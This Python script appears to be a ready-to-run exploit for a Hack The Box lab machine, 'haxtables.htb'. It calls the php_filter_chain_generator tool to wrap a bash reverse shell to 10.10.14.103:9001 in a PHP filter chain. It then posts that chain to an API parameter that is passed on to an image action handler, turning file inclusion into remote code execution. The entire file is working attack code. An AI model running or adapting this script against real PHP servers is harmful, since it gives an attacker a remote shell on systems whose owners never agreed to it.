#!/usr/bin/env python

import requests
import os, sys, subprocess
import pdb # Debugging purposes
from pwn import log

SUBDOMAIN_URLS = {
    "IMAGE": 'image.haxtables.htb/actions/action_handler.php?page=',
    "API": 'http://api.haxtables.htb/v3/tools/string/index.php'
}

PHP_FILTER_CHAIN_PATH = 'php_filter_chain_generator/php_filter_chain_generator.py'

def main():
    isPhpFilterChainScript = os.path.isfile(PHP_FILTER_CHAIN_PATH)
    
    if not isPhpFilterChainScript:
        print()
        log.failure('You must download the php_filter_chain_generator script from https://github.com/synacktiv/php_filter_chain_generator' 
                    'and place it in the same directory as this script.')
        sys.exit(1)


    PhpFilterCommand = ['python3', 
                        PHP_FILTER_CHAIN_PATH, 
                        '--chain', 
                        """<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.103/9001 0>&1'"); ?>"""]

    # Generate a php filter chain to get a reverse shell
    PhpFilterProcess = subprocess.Popen(PhpFilterCommand, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    ScriptOutput, ScriptError = PhpFilterProcess.communicate()

    if ScriptError:
        print()
        log.failure('There was an error generating php filter chain, please check the error below:')
        print(ScriptError.decode('utf-8'))
        sys.exit(1)

    # Get the php filter chain (ignoring the first line which is optional metadata)
    PhpFilterChain = ScriptOutput.decode('utf-8').strip().split('\n')[-1]
    
    jsonData = {
      'action': 'str2hex',
      'file_url' : f'{SUBDOMAIN_URLS["IMAGE"]}{PhpFilterChain}',
    }

    requests.post(SUBDOMAIN_URLS['API'], json=jsonData)

if __name__ == '__main__':
    main()